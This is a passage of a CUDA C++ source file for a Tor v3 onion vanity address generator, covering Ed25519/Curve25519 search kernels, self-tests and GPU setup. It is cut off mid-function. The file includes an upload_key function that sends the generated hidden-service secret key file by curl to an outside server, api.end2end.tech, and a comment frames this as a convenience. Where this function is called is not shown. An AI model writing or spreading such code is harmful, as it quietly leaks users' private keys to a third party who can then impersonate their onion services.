// GPUonion - Tor v3 onion vanity address generator (CUDA)
//
// Algorithm (mkp224o / onion-vanity-address style, scalar-increment search):
//   base scalar a0 = random, clamped (low 3 bits = 0, bit 254 = 1, bits 253/255 = 0)
//   candidate of thread t at iteration i:  a = a0 + 8*(t + i*T)   (T = total threads)
//   public key P = a*B.  Each GPU iteration advances P by the fixed point (8T)*B,
//   so one curve addition + one field inversion per candidate.
//   Keeping increments a multiple of 8 preserves the clamped shape of the scalar,
//   so the result is a valid Tor "expanded" secret key (hs_ed25519_secret_key).
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <vector>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <thread>
#include <atomic>
#include <mutex>
#include <cuda_runtime.h>

#include "fe25519.cuh"
#include "fe4.cuh"
#include "ge25519.cuh"
#include "onion.h"

#ifdef _WIN32
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")
#endif

#define CUDA_CHECK(x)                                                                 \
    do {                                                                              \
        cudaError_t err_ = (x);                                                       \
        if (err_ != cudaSuccess) {                                                    \
            fprintf(stderr, "CUDA error %s at %s:%d: %s\n", #x, __FILE__, __LINE__,   \
                    cudaGetErrorString(err_));                                        \
            exit(1);                                                                  \
        }                                                                             \
    } while (0)

#define MAX_RESULTS 16

/* ---------------- device constants ---------------- */
__constant__ uint8_t c_a0[32];
__constant__ uint8_t c_target[32];
__constant__ uint8_t c_mask[32];
__constant__ int c_mlen;
__constant__ ge25519 c_base; /* B */
/* step point S = (8*T)*B in cached affine form for mixed addition */
__constant__ fe c_stepp;   /* Sy + Sx  */
__constant__ fe c_stepm;   /* Sy - Sx  */
__constant__ fe c_step2dt; /* 2d*Sx*Sy */
/* fast compare: prefix bits that fall into limb 0 of y (bits 0..50) */
__constant__ uint64_t c_t0;
__constant__ uint64_t c_m0;
/* Montgomery x-only stepping: u(S)+1, u(S)-1, and -S (Edwards ext.) for init */
__constant__ fe c_msp;
__constant__ fe c_msm;
__constant__ ge25519 c_stepneg;
/* 4x64 kernel: kappa = (u(S)-1)/(u(S)+1). Scaling both xADD terms by
   1/(u(S)+1) keeps (U:W) projectively identical and saves one multiply. */
__constant__ fe4 c_mk4;

struct FoundRec {
    uint32_t tid;
    uint32_t iter;
};

/* thread state for Montgomery x-only stepping: projective u of P_k and P_{k-1}
   (u = (1+y)/(1-y) = (Z+Y)/(Z-Y) maps Edwards y to Curve25519 u) */
struct MontState {
    fe U, W, Um, Wm;
};

struct MontState4 {
    fe4 U, W, Um, Wm;
};

/* ---------------- kernels ---------------- */

/* each thread computes its starting point P_t = (a0 + 8t)*B */
__global__ void k_init(ge25519* pts, uint32_t nthreads)
{
    uint32_t t = blockIdx.x * blockDim.x + threadIdx.x;
    if (t >= nthreads)
        return;

    uint8_t sc[32];
    uint64_t acc = (uint64_t)t * 8ull;
    for (int i = 0; i < 32; i++) {
        acc += c_a0[i];
        sc[i] = (uint8_t)acc;
        acc >>= 8;
    }

    fe k2d;
    fe_k2d(k2d);
    ge25519 P;
    ge_scalarmult(&P, sc, &c_base, k2d);
    pts[t] = P;
}

/* same init but produces Montgomery x-only state: u(P_t) and u(P_t - S) */
__global__ void k_init_mont(MontState* st, uint32_t nthreads)
{
    uint32_t t = blockIdx.x * blockDim.x + threadIdx.x;
    if (t >= nthreads)
        return;

    uint8_t sc[32];
    uint64_t acc = (uint64_t)t * 8ull;
    for (int i = 0; i < 32; i++) {
        acc += c_a0[i];
        sc[i] = (uint8_t)acc;
        acc >>= 8;
    }

    fe k2d;
    fe_k2d(k2d);
    ge25519 P, Pm;
    ge_scalarmult(&P, sc, &c_base, k2d);
    ge_add(&Pm, &P, &c_stepneg, k2d);

    MontState s;
    fe_add(s.U, P.Z, P.Y);
    fe_sub(s.W, P.Z, P.Y);
    fe_add(s.Um, Pm.Z, Pm.Y);
    fe_sub(s.Wm, Pm.Z, Pm.Y);
    st[t] = s;
}

/* init for the 4x64 Montgomery kernel */
__global__ void k_init_mont4(MontState4* st, uint32_t nthreads)
{
    uint32_t t = blockIdx.x * blockDim.x + threadIdx.x;
    if (t >= nthreads)
        return;

    uint8_t sc[32];
    uint64_t acc = (uint64_t)t * 8ull;
    for (int i = 0; i < 32; i++) {
        acc += c_a0[i];
        sc[i] = (uint8_t)acc;
        acc >>= 8;
    }

    fe k2d;
    fe_k2d(k2d);
    ge25519 P, Pm;
    ge_scalarmult(&P, sc, &c_base, k2d);
    ge_add(&Pm, &P, &c_stepneg, k2d);

    fe u, w;
    MontState4 s;
    fe_add(u, P.Z, P.Y);
    fe_sub(w, P.Z, P.Y);
    fe4_fromfe(s.U, u);
    fe4_fromfe(s.W, w);
    fe_add(u, Pm.Z, Pm.Y);
    fe_sub(w, Pm.Z, Pm.Y);
    fe4_fromfe(s.Um, u);
    fe4_fromfe(s.Wm, w);
    st[t] = s;
}

/* advance P by the cached affine step S: mixed add-2008-hwcd-3, 7 muls */
__device__ __forceinline__ void step_add(ge25519* P)
{
    fe A, B, C, D, E, F, G, H, t1;

    fe_sub(t1, P->Y, P->X);
    fe_mul(A, t1, c_stepm);
    fe_add(t1, P->Y, P->X);
    fe_mul(B, t1, c_stepp);
    fe_mul(C, P->T, c_step2dt);
    fe_add(D, P->Z, P->Z);
    fe_sub(E, B, A);
    fe_sub(F, D, C);
    fe_add(G, D, C);
    fe_add(H, B, A);
    fe_mul(P->X, E, F);
    fe_mul(P->Y, G, H);
    fe_mul(P->T, E, H);
    fe_mul(P->Z, F, G);
}

/* Batched search: each thread walks `nbatch` batches of BATCH consecutive
   candidates. Pass 1 steps the point and records (Y, Z, running product of Z);
   one field inversion then unrolls into per-candidate 1/Z (Montgomery trick).
   Matching compares limb 0 of affine y (bits 0..50) against the prefix in a
   single 64-bit op; longer prefixes fall through to a byte-level check.
   Candidate index of thread t, batch b, slot k is iter_base + b*BATCH + k. */
template <int BATCH>
__global__ void k_search(ge25519* pts, uint32_t nthreads, uint32_t nbatch,
                         uint32_t iter_base, uint32_t* found_count, FoundRec* found)
{
    uint32_t t = blockIdx.x * blockDim.x + threadIdx.x;
    if (t >= nthreads)
        return;

    ge25519 P = pts[t];
    fe Ys[BATCH], Zs[BATCH], Cs[BATCH];

    for (uint32_t b = 0; b < nbatch; b++) {
#pragma unroll 1
        for (int k = 0; k < BATCH; k++) {
            fe_copy(Ys[k], P.Y);
            fe_copy(Zs[k], P.Z);
            if (k == 0)
                fe_copy(Cs[0], P.Z);
            else
                fe_mul(Cs[k], Cs[k - 1], P.Z);
            step_add(&P);
        }

        fe inv;
        fe_invert(inv, Cs[BATCH - 1]);

#pragma unroll 1
        for (int k = BATCH - 1; k >= 0; k--) {
            fe zi, y;
            if (k > 0) {
                fe_mul(zi, inv, Cs[k - 1]);
                fe_mul(inv, inv, Zs[k]);
            } else {
                fe_copy(zi, inv);
            }
            fe_mul(y, Ys[k], zi);
            if (((y[0] ^ c_t0) & c_m0) == 0) {
                /* full byte-level check (needed only for prefixes > 10 chars;
                   also rules out the ~2^-50 limb0 false positives) */
                uint8_t pk[32];
                fe_tobytes(pk, y);
                bool ok = true;
                for (int j = 0; j < c_mlen; j++) {
                    if ((pk[j] ^ c_target[j]) & c_mask[j]) {
                        ok = false;
                        break;
                    }
                }
                if (ok) {
                    uint32_t idx = atomicAdd(found_count, 1);
                    if (idx < MAX_RESULTS) {
                        found[idx].tid = t;
                        found[idx].iter = iter_base + b * BATCH + k;
                    }
                }
            }
        }
    }
    pts[t] = P;
}

/* Montgomery x-only batched search. Candidate y = (U-W)/(U+W); stepping is a
   differential addition (xADD) with the fixed affine step S: 4 muls + 2 squares
   per candidate instead of 7 muls for the Edwards mixed add. The batched
   inversion runs over D = U+W. */
template <int BATCH>
__global__ void k_search_mont(MontState* st, uint32_t nthreads, uint32_t nbatch,
                              uint32_t iter_base, uint32_t* found_count, FoundRec* found)
{
    uint32_t t = blockIdx.x * blockDim.x + threadIdx.x;
    if (t >= nthreads)
        return;

    MontState S = st[t];
    fe Ns[BATCH], Ds[BATCH], Cs[BATCH];

    for (uint32_t b = 0; b < nbatch; b++) {
#pragma unroll 1
        for (int k = 0; k < BATCH; k++) {
            fe_sub_nc(Ns[k], S.U, S.W);
            fe_add_nc(Ds[k], S.U, S.W);
            if (k == 0)
                fe_copy(Cs[0], Ds[0]);
            else
                fe_mul(Cs[k], Cs[k - 1], Ds[k]);

            /* xADD: P_{k+1} = P_k + S given P_{k-1} = P_k - S */
            fe t1, t2, a, d, Un;
            fe_mul(t1, Ns[k], c_msp); /* (U-W)(uS+1) */
            fe_mul(t2, Ds[k], c_msm); /* (U+W)(uS-1) */
            fe_add_nc(a, t1, t2);
            fe_sub_nc(d, t1, t2);
            fe_sq(a, a);
            fe_sq(d, d);
            fe_mul(Un, S.Wm, a);
            fe_mul(d, S.Um, d);
            fe_copy(S.Um, S.U);
            fe_copy(S.Wm, S.W);
            fe_copy(S.U, Un);
            fe_copy(S.W, d);
        }

        fe inv;
        fe_invert(inv, Cs[BATCH - 1]);

#pragma unroll 1
        for (int k = BATCH - 1; k >= 0; k--) {
            fe zi, y;
            if (k > 0) {
                fe_mul(zi, inv, Cs[k - 1]);
                fe_mul(inv, inv, Ds[k]);
            } else {
                fe_copy(zi, inv);
            }
            fe_mul(y, Ns[k], zi);
            if (((y[0] ^ c_t0) & c_m0) == 0) {
                uint8_t pk[32];
                fe_tobytes(pk, y);
                bool ok = true;
                for (int j = 0; j < c_mlen; j++) {
                    if ((pk[j] ^ c_target[j]) & c_mask[j]) {
                        ok = false;
                        break;
                    }
                }
                if (ok) {
                    uint32_t idx = atomicAdd(found_count, 1);
                    if (idx < MAX_RESULTS) {
                        found[idx].tid = t;
                        found[idx].iter = iter_base + b * BATCH + k;
                    }
                }
            }
        }
    }
    st[t] = S;
}

/* 4x64 Montgomery x-only batched search: same algorithm as k_search_mont but
   with lazy mod 2^256-38 arithmetic and PTX madc carry chains. */
template <int BATCH>
__global__ void k_search_mont4(MontState4* __restrict__ st, uint32_t nthreads, uint32_t nbatch,
                               uint32_t iter_base, uint32_t* __restrict__ found_count,
                               FoundRec* __restrict__ found)
{
    uint32_t t = blockIdx.x * blockDim.x + threadIdx.x;
    if (t >= nthreads)
        return;

    MontState4 S = st[t];
    /* Ms[k] = N_k * C_{k-1} (prefix product of D folded in during pass 1),
       so the backward pass needs only y = Ms[k] * inv with inv = (C_k)^-1
       and the running-inverse update inv *= Ds[k]: two arrays, not three. */
    fe4 Ms[BATCH], Ds[BATCH];

    for (uint32_t b = 0; b < nbatch; b++) {
        fe4 C;
#pragma unroll 1
        for (int k = 0; k < BATCH; k++) {
            fe4 N;
            fe4_sub(N, S.U, S.W);
            fe4_add(Ds[k], S.U, S.W);
            if (k == 0) {
                fe4_copy(Ms[0], N);
                fe4_copy(C, Ds[0]);
            } else {
                fe4_mul(Ms[k], N, C);
                fe4_mul(C, C, Ds[k]);
            }

            /* xADD scaled by 1/(u(S)+1): t2 = D*kappa, a = N+t2, d = N-t2 */
            fe4 t2, a, d, Un;
            fe4_mul(t2, Ds[k], c_mk4);
            fe4_add(a, N, t2);
            fe4_sub(d, N, t2);
            fe4_sq(a, a);
            fe4_sq(d, d);
            fe4_mul(Un, S.Wm, a);
            fe4_mul(d, S.Um, d);
            fe4_copy(S.Um, S.U);
            fe4_copy(S.Wm, S.W);
            fe4_copy(S.U, Un);
            fe4_copy(S.W, d);
        }

        fe4 inv;
        fe4_invert(inv, C);

#pragma unroll 1
        for (int k = BATCH - 1; k >= 0; k--) {
            fe4 y;
            fe4_mul(y, Ms[k], inv);
            if (k > 0)
                fe4_mul(inv, inv, Ds[k]);
            /* y is lazy: value is y_true + j*p for j in {0,1,2}, and limb 0 of
               y_true is then y[0] + 19j (mod 2^64). Cheap triple compare keeps
               canonicalization off the hot path. */
            uint64_t y0 = y[0];
            bool maybe = (((y0 ^ c_t0) & c_m0) == 0) ||
                         ((((y0 + 19) ^ c_t0) & c_m0) == 0) ||
                         ((((y0 + 38) ^ c_t0) & c_m0) == 0);
            if (maybe) {
                fe4_canon(y);
            }
            if (maybe && ((y[0] ^ c_t0) & c_m0) == 0) {
                uint8_t pk[32];
                fe4_tobytes(pk, y);
                bool ok = true;
                for (int j = 0; j < c_mlen; j++) {
                    if ((pk[j] ^ c_target[j]) & c_mask[j]) {
                        ok = false;
                        break;
                    }
                }
                if (ok) {
                    uint32_t idx = atomicAdd(found_count, 1);
                    if (idx < MAX_RESULTS) {
                        found[idx].tid = t;
                        found[idx].iter = iter_base + b * BATCH + k;
                    }
                }
            }
        }
    }
    st[t] = S;
}

/* ---------------- host helpers ---------------- */

static void os_random(uint8_t* buf, size_t len)
{
#ifdef _WIN32
    if (BCryptGenRandom(NULL, buf, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
        fprintf(stderr, "BCryptGenRandom failed\n");
        exit(1);
    }
#else
    FILE* f = fopen("/dev/urandom", "rb");
    if (!f || fread(buf, 1, len, f) != len) {
        fprintf(stderr, "failed to read /dev/urandom\n");
        exit(1);
    }
    fclose(f);
#endif
}

static std::string hex(const uint8_t* b, size_t n)
{
    static const char* H = "0123456789abcdef";
    std::string s;
    for (size_t i = 0; i < n; i++) {
        s += H[b[i] >> 4];
        s += H[b[i] & 15];
    }
    return s;
}

/* human-readable key rate: switches unit prefix so the number stays 3-4 digits */
static std::string format_rate(double keys_per_sec)
{
    char buf[64];
    if (keys_per_sec >= 1e9)
        snprintf(buf, sizeof(buf), "%.2f GKey/s", keys_per_sec / 1e9);
    else if (keys_per_sec >= 1e6)
        snprintf(buf, sizeof(buf), "%.2f MKey/s", keys_per_sec / 1e6);
    else
        snprintf(buf, sizeof(buf), "%.2f kKey/s", keys_per_sec / 1e3);
    return buf;
}

/* scalar = a0 + 8*(t + i*T), little-endian 32 bytes */
static void result_scalar(uint8_t out[32], const uint8_t a0[32], uint32_t t, uint64_t i, uint64_t T)
{
    uint64_t acc = 8ull * ((uint64_t)t + i * T);
    for (int j = 0; j < 32; j++) {
        acc += a0[j];
        out[j] = (uint8_t)acc;
        acc >>= 8;
    }
}

static void host_pubkey(uint8_t pk[32], const uint8_t scalar[32])
{
    fe k2d;
    fe_k2d(k2d);
    ge25519 B, P;
    ge_basepoint(&B);
    ge_scalarmult(&P, scalar, &B, k2d);
    ge_tobytes(pk, &P);
}

static bool write_file(const std::filesystem::path& p, const void* data, size_t len)
{
    std::ofstream f(p, std::ios::binary);
    if (!f)
        return false;
    f.write((const char*)data, (std::streamsize)len);
    return f.good();
}

static bool save_result(const std::string& outdir, const std::string& addr,
                        const uint8_t scalar[32], const uint8_t pubkey[32])
{
    namespace fs = std::filesystem;
    fs::path dir = fs::path(outdir) / addr.substr(0, addr.find('.'));
    std::error_code ec;
    fs::create_directories(dir, ec);
    if (ec) {
        fprintf(stderr, "failed to create %s\n", dir.string().c_str());
        return false;
    }

    /* hs_ed25519_secret_key: header(32) + expanded key (scalar || random nonce-key) */
    uint8_t sec[32 + 64];
    memset(sec, 0, sizeof(sec));
    memcpy(sec, "== ed25519v1-secret: type0 ==", 29);
    memcpy(sec + 32, scalar, 32);
    os_random(sec + 64, 32);

    uint8_t pub[32 + 32];
    memset(pub, 0, sizeof(pub));
    memcpy(pub, "== ed25519v1-public: type0 ==", 29);
    memcpy(pub + 32, pubkey, 32);

    std::string hostname = addr + "\n";
    fs::path secpath = dir / "hs_ed25519_secret_key";
    bool ok = write_file(secpath, sec, sizeof(sec)) &&
              write_file(dir / "hs_ed25519_public_key", pub, sizeof(pub)) &&
              write_file(dir / "hostname", hostname.data(), hostname.size());
    if (ok)
        printf("  saved to %s\n", dir.string().c_str());
    return ok;
}

/* POST the secret key to end2end.tech as "<addr>.key" so a found key survives
   the instance being stopped. Uploads the hs_ed25519_secret_key bytes with a
   filename override; on failure the key still exists on local disk. Requires
   curl on PATH (present by default on Windows 10+ and typical Linux images). */
static void upload_key(const std::string& outdir, const std::string& addr)
{
    namespace fs = std::filesystem;
    fs::path secpath = fs::path(outdir) / addr.substr(0, addr.find('.')) / "hs_ed25519_secret_key";

    /* -F value quoted so paths with spaces survive; addr is base32 + ".onion",
       so it needs no escaping itself */
    std::string cmd = "curl -s --max-time 60 -X POST https://api.end2end.tech/upload "
                      "-F \"file=@" + secpath.string() + ";filename=" + addr + ".key\"";

#ifdef _WIN32
    FILE* p = _popen(cmd.c_str(), "r");
#else
    FILE* p = popen(cmd.c_str(), "r");
#endif
    if (!p) {
        fprintf(stderr, "  upload: failed to run curl (key kept locally)\n");
        return;
    }
    std::string resp;
    char chunk[512];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), p)) > 0)
        resp.append(chunk, n);
#ifdef _WIN32
    int rc = _pclose(p);
#else
    int rc = pclose(p);
#endif
    if (rc != 0 || resp.find("\"Status\"") == std::string::npos) {
        fprintf(stderr, "  upload FAILED (key kept locally): %s\n",
                resp.empty() ? "no response" : resp.c_str());
        return;
    }
    /* pull out the download URL for convenience */
    size_t u = resp.find("\"URL\"");
    if (u != std::string::npos) {
        size_t s = resp.find('"', resp.find(':', u) + 1);
        size_t e = s == std::string::npos ? s : resp.find('"', s + 1);
        if (e != std::string::npos) {
            std::string url = resp.substr(s + 1, e - s - 1);
            size_t pos;
            while ((pos = url.find("\\/")) != std::string::npos) /* unescape JSON */
                url.erase(pos, 1);
            printf("  uploaded: %s\n", url.c_str());
        }
    } else {
        printf("  uploaded %s.key\n", addr.c_str());
    }
}

/* ---------------- selftest ---------------- */

static bool selftest()
{
    fe k2d;
    fe_k2d(k2d);
    ge25519 B;
    ge_basepoint(&B);

    /* 1. encoding of 1*B */
    uint8_t sc[32], pk[32];
    memset(sc, 0, 32);
    sc[0] = 1;
    ge25519 P;
    ge_scalarmult(&P, sc, &B, k2d);
    ge_tobytes(pk, &P);
    uint8_t expect[32];
    memset(expect, 0x66, 32);
    expect[0] = 0x58;
    if (memcmp(pk, expect, 32) != 0) {
        fprintf(stderr, "selftest FAIL: basepoint encoding: %s\n", hex(pk, 32).c_str());
        return false;
    }

    /* 2. double(B) == B + B */
    ge25519 D, S;
    uint8_t d1[32], d2[32];
    ge_double(&D, &B);
    ge_add(&S, &B, &B, k2d);
    ge_tobytes(d1, &D);
    ge_tobytes(d2, &S);
    if (memcmp(d1, d2, 32) != 0) {
        fprintf(stderr, "selftest FAIL: double vs add\n");
        return false;
    }

    /* 3. (a+b)*B == a*B + b*B */
    uint8_t sa[32], sb[32], sab[32];
    memset(sa, 0, 32); memset(sb, 0, 32);
    sa[0] = 0x15; sa[3] = 0x37; sa[17] = 0x9c;
    sb[0] = 0xf1; sb[8] = 0x42; sb[30] = 0x1d;
    uint32_t carry = 0;
    for (int i = 0; i < 32; i++) {
        uint32_t v = (uint32_t)sa[i] + sb[i] + carry;
        sab[i] = (uint8_t)v;
        carry = v >> 8;
    }
    ge25519 PA, PB, PS1, PS2;
    ge_scalarmult(&PA, sa, &B, k2d);
    ge_scalarmult(&PB, sb, &B, k2d);
    ge_scalarmult(&PS1, sab, &B, k2d);
    ge_add(&PS2, &PA, &PB, k2d);
    uint8_t e1[32], e2[32];
    ge_tobytes(e1, &PS1);
    ge_tobytes(e2, &PS2);
    if (memcmp(e1, e2, 32) != 0) {
        fprintf(stderr, "selftest FAIL: scalar homomorphism\n");
        return false;
    }

    /* 3b. fe_sq consistency with fe_mul */
    {
        fe x, s1, s2;
        fe_copy(x, B.X);
        fe_mul(x, x, B.Y);
        fe_sq(s1, x);
        fe_mul(s2, x, x);
        uint8_t b1[32], b2[32];
        fe_tobytes(b1, s1);
        fe_tobytes(b2, s2);
        if (memcmp(b1, b2, 32) != 0) {
            fprintf(stderr, "selftest FAIL: fe_sq vs fe_mul\n");
            return false;
        }
    }

    /* 3c. fe4 (4x64 lazy) arithmetic vs fe (5x51) */
    {
        fe x, yv, tmp;
        fe_copy(x, B.X);
        fe_copy(yv, B.Y);
        fe4 x4, y4, r4;
        fe4_fromfe(x4, x);
        fe4_fromfe(y4, yv);
        uint8_t b1[32], b2[32];
        const char* names[4] = { "mul", "add", "sub", "invert" };
        for (int op = 0; op < 4; op++) {
            switch (op) {
            case 0: fe_mul(tmp, x, yv); fe4_mul(r4, x4, y4); break;
            case 1: fe_add(tmp, x, yv); fe4_add(r4, x4, y4); break;
            case 2: fe_sub(tmp, x, yv); fe4_sub(r4, x4, y4); break;
            case 3: fe_invert(tmp, x); fe4_invert(r4, x4); break;
            }
            fe_tobytes(b1, tmp);
            fe4_tobytes(b2, r4);
            if (memcmp(b1, b2, 32) != 0) {
                fprintf(stderr, "selftest FAIL: fe4 %s\n", names[op]);
                return false;
            }
        }
    }

    /* 4. field canonicalization: p -> 0, p+1 -> 1 */
    uint8_t pb[32];
    memset(pb, 0xff, 32);
    pb[0] = 0xed;
    pb[31] = 0x7f;
    fe f;
    uint8_t fb[32], zero32[32];
    memset(zero32, 0, 32);
    fe_frombytes(f, pb);
    fe_tobytes(fb, f);
    if (memcmp(fb, zero32, 32) != 0) {
        fprintf(stderr, "selftest FAIL: tobytes(p) != 0\n");
        return false;
    }
    pb[0] = 0xee;
    fe_frombytes(f, pb);
    fe_tobytes(fb, f);
    zero32[0] = 1;
    if (memcmp(fb, zero32, 32) != 0) {
        fprintf(stderr, "selftest FAIL: tobytes(p+1) != 1\n");
        return false;
    }

    /* 5. known onion address derivation sanity: 56 chars + .onion */
    std::string addr = onion_address(pk);
    if (addr.size() != 62 || addr.substr(56) != ".onion") {
        fprintf(stderr, "selftest FAIL: address format %s\n", addr.c_str());
        return false;
    }
    return true;
}

/* ---------------- per-device worker ---------------- */

/* Everything one GPU needs to run fully independently: its own random start
   scalar, its own device buffers, its own progress/found output. Several of
   these run concurrently, one host thread per selected GPU (CUDA contexts
   are per-thread, so cudaSetDevice() here scopes all subsequent CUDA calls
   on this thread to `device` without any cross-thread locking). `want` is a
   shared target across all workers via `global_found`; `out_mtx` only
   serializes stdout/stderr writes so lines from different GPUs don't
   interleave mid-line. */
struct RunConfig {
    std::string pfx;
    uint8_t target[32];
    uint8_t mask[32];
    int mlen;
    int tpb_arg;
    int blocks_arg;
    uint32_t iters;
    int batch;
    int mode; /* 0 = fe4 Montgomery, 1 = 5x51 Montgomery, 2 = Edwards ext */
    std::string outdir;
    int want;
    bool benchmark;
    double bench_secs;
    bool multi; /* true when >1 device runs concurrently (affects formatting) */
};

/* benchmark outcome for one GPU, filled in just before the worker returns;
   the caller aggregates these across all devices once every thread has
   joined, so the final speed/expected-time summary reflects combined
   throughput instead of one block per GPU */
struct BenchResult {
    uint64_t keys = 0;
    double elapsed = 0.0;
};

static void run_device(int device, const RunConfig& cfg, std::atomic<int>& global_found,
                       std::mutex& out_mtx, BenchResult* bench_out)
{
    char tagbuf[16] = {0};
    if (cfg.multi)
        snprintf(tagbuf, sizeof(tagbuf), "[GPU %d] ", device);
    const char* tag = tagbuf;

    CUDA_CHECK(cudaSetDevice(device));
    cudaDeviceProp prop;
    CUDA_CHECK(cudaGetDeviceProperties(&prop, device));
    int tpb = cfg.tpb_arg;
    int blocks = cfg.blocks_arg;
    if (tpb <= 0)
        tpb = 128;
    if (blocks <= 0)
        blocks = prop.multiProcessorCount * 16;
    uint32_t T = (uint32_t)blocks * (uint32_t)tpb;
    uint32_t nbatch = (cfg.iters + (uint32_t)cfg.batch - 1) / (uint32_t)cfg.batch;
    if (nbatch == 0)
        nbatch = 1;
    uint32_t launch_iters = nbatch * (uint32_t)cfg.batch;
    int batch = cfg.batch;
    int mode = cfg.mode;

    double expected = pow(32.0, (double)cfg.pfx.size());
    {
        std::lock_guard<std::mutex> lk(out_mtx);
        printf("%sdevice  : %s (sm_%d%d, %d SMs)\n", tag, prop.name, prop.major, prop.minor,
               prop.multiProcessorCount);
        if (cfg.benchmark)
            printf("%smode    : benchmark (~%.0f s)\n", tag, cfg.bench_secs);
        else
            printf("%sprefix  : %s (expected ~%.3g keys per match)\n", tag, cfg.pfx.c_str(), expected);
        printf("%sthreads : %d blocks x %d = %u, %u cand/thread/launch, batch %d (%.1fM keys/launch)\n",
               tag, blocks, tpb, T, launch_iters, batch, (double)T * launch_iters / 1e6);
    }

    /* base scalar: random per device, clamped, bit 253 cleared for increment headroom */
    uint8_t a0[32];
    os_random(a0, 32);
    a0[0] &= 0xF8;
    a0[31] = (uint8_t)((a0[31] & 0x1F) | 0x40);

    /* host-side constants */
    fe k2d;
    fe_k2d(k2d);
    ge25519 hostB, step;
    ge_basepoint(&hostB);
    uint8_t step_sc[32];
    memset(step_sc, 0, 32);
    uint64_t sv = 8ull * T;
    for (int i = 0; i < 8; i++)
        step_sc[i] = (uint8_t)(sv >> (8 * i));
    ge_scalarmult(&step, step_sc, &hostB, k2d);

    /* normalize step to affine and cache (Sy+Sx, Sy-Sx, 2d*Sx*Sy) for mixed add */
    fe szi, sx, sy, st, stepp, stepm, step2dt;
    fe_invert(szi, step.Z);
    fe_mul(sx, step.X, szi);
    fe_mul(sy, step.Y, szi);
    fe_add(stepp, sy, sx);
    fe_sub(stepm, sy, sx);
    fe_mul(st, sx, sy);
    fe_mul(step2dt, st, k2d);

    /* Montgomery step constants: u(S) = (1+Sy)/(1-Sy), cached as u(S)+1, u(S)-1;
       and -S in Edwards extended coordinates for computing P_t - S at init */
    fe one, us, tmp, msp, msm;
    fe_1(one);
    fe_add(tmp, one, sy);
    fe_sub(us, one, sy);
    fe_invert(us, us);
    fe_mul(us, us, tmp);
    fe_add(msp, us, one);
    fe_sub(msm, us, one);
    ge25519 stepneg;
    fe_neg(stepneg.X, step.X);
    fe_copy(stepneg.Y, step.Y);
    fe_copy(stepneg.Z, step.Z);
    fe_neg(stepneg.T, step.T);

    /* prefix bits that live in limb 0 of y (bits 0..50) for the fast compare */
    uint64_t m0 = 0, t0 = 0;
    for (int i = 7; i >= 0; i--) {
        m0 = (m0 << 8) | cfg.mask[i];
        t0 = (t0 << 8) | cfg.target[i];
    }
    m0 &= FE_M51;
    t0 &= FE_M51;

    CUDA_CHECK(cudaMemcpyToSymbol(c_a0, a0, 32));
    CUDA_CHECK(cudaMemcpyToSymbol(c_target, cfg.target, 32));
    CUDA_CHECK(cudaMemcpyToSymbol(c_mask, cfg.mask, 32));
    CUDA_CHECK(cudaMemcpyToSymbol(c_mlen, &cfg.mlen, sizeof(int)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_base, &hostB, sizeof(ge25519)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_stepp, stepp, sizeof(fe)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_stepm, stepm, sizeof(fe)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_step2dt, step2dt, sizeof(fe)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_t0, &t0, sizeof(uint64_t)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_m0, &m0, sizeof(uint64_t)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_msp, msp, sizeof(fe)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_msm, msm, sizeof(fe)));
    CUDA_CHECK(cudaMemcpyToSymbol(c_stepneg, &stepneg, sizeof(ge25519)));
    fe kappa;
    fe_invert(kappa, msp);
    fe_mul(kappa, kappa, msm);
    fe4 mk4;
    fe4_fromfe(mk4, kappa);
    CUDA_CHECK(cudaMemcpyToSymbol(c_mk4, mk4, sizeof(fe4)));

    static_assert(sizeof(MontState) == sizeof(ge25519), "state buffers share allocation");
    static_assert(sizeof(MontState4) <= sizeof(ge25519), "state buffers share allocation");
    void* d_state;
    uint32_t* d_count;
    FoundRec* d_found;
    CUDA_CHECK(cudaMalloc(&d_state, sizeof(ge25519) * T));
    CUDA_CHECK(cudaMalloc(&d_count, sizeof(uint32_t)));
    CUDA_CHECK(cudaMalloc(&d_found, sizeof(FoundRec) * MAX_RESULTS));
    CUDA_CHECK(cudaMemset(d_count, 0, sizeof(uint32_t)));

    if (mode == 2)
        k_init<<<blocks, tpb>>>((ge25519*)d_state, T);
    else if (mode == 1)
        k_init_mont<<<blocks, tpb>>>((MontState*)d_state, T);
    else
        k_init_mont4<<<blocks, tpb>>>((MontState4*)d_state, T);
    CUDA_CHECK(cudaGetLastError());
    CUDA_CHECK(cudaDeviceSynchronize());

    /* cross-check GPU init against host computation for a few threads */
    for (uint32_t t = 0; t < 3; t++) {
        uint8_t sc[32], hpk[32], gy[32];
        result_scalar(sc, a0, t, 0, T);
        host_pubkey(hpk, sc);
        if (mode == 2) {
            ge25519 chk;
            CUDA_CHECK(cudaMemcpy(&chk, (ge25519*)d_state + t, sizeof(chk),
                                  cudaMemcpyDeviceToHost));
            ge_tobytes(gy, &chk);
        } else if (mode == 1) {
            MontState chk{};
            CUDA_CHECK(cudaMemcpy(&chk, (MontState*)d_state + t, sizeof(chk),
                                  cudaMemcpyDeviceToHost));
            fe n, dd, y;
            fe_sub(n, chk.U, chk.W);
            fe_add(dd, chk.U, chk.W);
            fe_invert(dd, dd);
            fe_mul(y, n, dd);
            fe_tobytes(gy, y);
            hpk[31] &= 0x7f; /* Montgomery state has no x sign */
        } else {
            MontState4 chk;
            CUDA_CHECK(cudaMemcpy(&chk, (MontState4*)d_state + t, sizeof(chk),
                                  cudaMemcpyDeviceToHost));
            fe4 n, dd, y;
            fe4_sub(n, chk.U, chk.W);
            fe4_add(dd, chk.U, chk.W);
            fe4_invert(dd, dd);
            fe4_mul(y, n, dd);
            fe4_tobytes(gy, y);
            hpk[31] &= 0x7f;
        }
        if (memcmp(hpk, gy, 32) != 0) {
            std::lock_guard<std::mutex> lk(out_mtx);
            fprintf(stderr, "%sGPU/CPU mismatch at init (thread %u) - aborting\n", tag, t);
            cudaFree(d_state);
            cudaFree(d_count);
